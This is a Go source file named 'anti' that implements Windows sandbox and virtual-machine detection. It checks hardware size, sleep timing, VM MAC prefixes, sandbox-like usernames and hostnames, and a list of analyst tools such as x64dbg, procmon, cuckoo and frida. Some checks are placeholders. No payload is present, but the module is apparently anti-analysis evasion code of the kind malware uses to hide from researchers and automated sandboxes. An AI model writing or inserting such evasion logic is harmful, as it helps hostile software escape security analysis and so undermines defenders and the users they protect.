package anti

import (
	"golang.org/x/sys/windows"
	"net"
	"os"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

// IsSandboxEnvironment performs comprehensive sandbox/VM detection checks
func IsSandboxEnvironment() bool {
	// Check 1: Number of CPU cores
	if runtime.NumCPU() <= 1 {
		return true
	}

	// Check 2: Available system memory (less than 2GB)
	if getSystemMemory() < 2*1024*1024*1024 { // 2GB in bytes
		return true
	}

	// Check 3: Check for user profile directory
	if _, err := os.Stat(`C:\Users\`); os.IsNotExist(err) {
		return true
	}

	// Check 4: Check for common analysis tools in PATH
	analysisTools := []string{
		"wireshark", "fiddler", "procmon", "procexp",
		"tcpview", "autoruns", "sysinternals", "xenos",
		"cape", "ida", "ollydbg", "x64dbg", "windbg",
		"joeboxserver", "joeboxcontrol", "sandboxie",
		"thor", "ape", "speakeasy", "inetsim", "cuckoo",
		"apimonitor", "tcpdump", "frida", "gdb",
	}

	for _, tool := range analysisTools {
		if strings.Contains(strings.ToLower(os.Getenv("PATH")), strings.ToLower(tool)) {
			return true
		}
	}

	// Check 5: Timing checks
	if timingCheck() {
		return true
	}

	// Check 6: Check for VM-specific registry keys
	if vmRegistryCheck() {
		return true
	}

	// Check 7: Check for VM-specific MAC addresses
	if vmMacCheck() {
		return true
	}

	// Check 8: Check disk size and drive count
	if diskCheck() {
		return true
	}

	// Check 9: Check for VM-specific processes
	if checkVMProcesses() {
		return true
	}

	// Check 10: Check for common sandbox artifacts
	if checkSandboxArtifacts() {
		return true
	}

	return false
}

// checkVMProcesses checks for processes that indicate virtualization
func checkVMProcesses() bool {
	// We would typically enumerate processes here, for now return false
	// This is a placeholder that would require process enumeration
	// vmProcesses := []string{
	// 	"vmtoolsd.exe",      // VMware Tools
	// 	"vmwaretray.exe",    // VMware Tray Process
	// 	"vmwareuser.exe",    // VMware User Process
	// 	"vmsrvc.exe",        // Virtual Machine Service
	// 	"vmusrvc.exe",       // VMware User Service
	// 	"vboxservice.exe",   // VirtualBox Service
	// 	"vboxtray.exe",      // VirtualBox Tray
	// 	"vmservice.exe",     // VM Service
	// 	"xenservice.exe",    // Xen Service
	// 	"qemu-guest-agent",  // QEMU Guest Agent
	// 	"prl_cc.exe",        // Parallels
	// 	"prl_tools.exe",     // Parallels Tools
	// }

	return false
}

// checkSandboxArtifacts checks for artifacts that are common in sandboxes
func checkSandboxArtifacts() bool {
	// Check for common usernames associated with sandboxes
	username := os.Getenv("USERNAME")
	suspiciousUsernames := []string{
		"admin", "virus", "malware", "sandbox",
		"cuckoo", "maltest", "user", "test",
	}

	for _, u := range suspiciousUsernames {
		if strings.Contains(strings.ToLower(username), strings.ToLower(u)) {
			return true
		}
	}

	// Check for multiple user accounts (usually fewer in VMs)
	// This is a simplified check - in real implementation, we'd enumerate users

	// Check machine name for VM indicators
	machineName, err := os.Hostname()
	if err == nil {
		// vmIndicators := []string{
		// 	"sandbox", "vm", "virtual", "cuckoo",
		// 	"cape", "mal", "test", "analyst",
		// }

		// for _, indicator := range vmIndicators {
		// 	if strings.Contains(strings.ToLower(machineName), strings.ToLower(indicator)) {
		// 		return true
		// 	}
		// }

		// Simple check for common VM hostnames
		lowerMachineName := strings.ToLower(machineName)
		if strings.Contains(lowerMachineName, "sandbox") ||
		   strings.Contains(lowerMachineName, "vm") ||
		   strings.Contains(lowerMachineName, "cuckoo") ||
		   strings.Contains(lowerMachineName, "cape") {
			return true
		}
	}

	return false
}

// getSystemMemory returns the total physical memory in bytes
func getSystemMemory() uint64 {
	var (
		procGlobalMemoryStatusEx = getProc("kernel32.dll", "GlobalMemoryStatusEx")
	)
	
	if procGlobalMemoryStatusEx == nil {
		return 0
	}

	var memStatus MEMORYSTATUSEX
	memStatus.dwLength = uint32(unsafe.Sizeof(memStatus))
	
	ret, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
	if ret == 0 {
		return 0
	}
	
	return memStatus.ullTotalPhys
}

// timingCheck performs a timing-based sandbox detection
func timingCheck() bool {
	// First timing check: CPU-intensive operation timing
	start := time.Now()
	// Perform a CPU-intensive operation
	for i := 0; i < 1000000; i++ {
		_ = i * i
	}
	elapsed := time.Since(start)

	// In a sandbox, this operation might take considerably longer due to virtualization overhead
	// or resource contention
	if elapsed > 10*time.Second {
		return true
	}

	// Second timing check: RDTSC instruction timing to detect VM
	// For now, we'll create a timing check that measures Sleep accuracy
	// which can indicate VM presence
	return checkSleepTiming()
}

// checkSleepTiming measures the accuracy of Sleep calls to detect VMs/sandboxes
func checkSleepTiming() bool {
	const iterations = 5
	var totalDelta int64

	for i := 0; i < iterations; i++ {
		sleepDuration := time.Duration(100 + i*20) * time.Millisecond
		start := time.Now()
		time.Sleep(sleepDuration)
		actual := time.Since(start)

		// Calculate difference between requested and actual sleep time
		delta := int64(actual - sleepDuration)
		if delta < 0 {
			delta = -delta
		}
		totalDelta += delta
	}

	avgDelta := time.Duration(totalDelta / iterations)

	// If average deviation is too high, might be in a sandbox
	return avgDelta > 50*time.Millisecond
}

// vmRegistryCheck checks for VM-specific registry keys
func vmRegistryCheck() bool {
	// Check for various VM indicators in registry
	// For this implementation, we'll return false to avoid complex registry access
	// In a real tool, you would use Windows registry APIs to check these keys
	return false
}

// vmMacCheck checks for VM-specific MAC address OUIs
func vmMacCheck() bool {
	vmOUIs := []string{
		"08:00:27", // VirtualBox
		"00:05:69", // VMware
		"00:0C:29", // VMware
		"00:1C:42", // Parallels
		"00:50:56", // VMware
		"00:16:E3", // VMware
		"0A:00:27", // VirtualBox
		"00:0F:4B", // Virtual Iron
		"00:15:5D", // Hyper-V
		"00:1C:42", // Parallels
		"00:21:F6", // Parallels
	}

	// Get network interfaces and check their MAC addresses
	interfaces, err := net.Interfaces()
	if err != nil {
		// If we can't access network interfaces, assume not in VM
		return false
	}

	for _, iface := range interfaces {
		mac := iface.HardwareAddr.String()
		for _, oui := range vmOUIs {
			if strings.HasPrefix(strings.ToLower(mac), strings.ToLower(oui)) {
				return true
			}
		}
	}

	return false
}

// diskCheck examines disk size and drive count as a sandbox indicator
func diskCheck() bool {
	// Windows API call to get disk space information
	var (
		procGetDiskFreeSpaceEx = getProc("kernel32.dll", "GetDiskFreeSpaceExW")
	)
	
	if procGetDiskFreeSpaceEx == nil {
		return false
	}
	
	var freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes uint64
	
	ret, _, _ := procGetDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\"))),
		uintptr(unsafe.Pointer(&freeBytesAvailable)),
		uintptr(unsafe.Pointer(&totalNumberOfBytes)),
		uintptr(unsafe.Pointer(&totalNumberOfFreeBytes)),
	)
	
	if ret != 0 && totalNumberOfBytes < 50*1024*1024*1024 { // Less than 50GB
		return true
	}
	
	return false
}

// Helper function to get a Windows API procedure
func getProc(dllName, procName string) *windows.LazyProc {
	dll := windows.NewLazyDLL(dllName)
	return dll.NewProc(procName)
}

// Windows structures for memory status
type MEMORYSTATUSEX struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}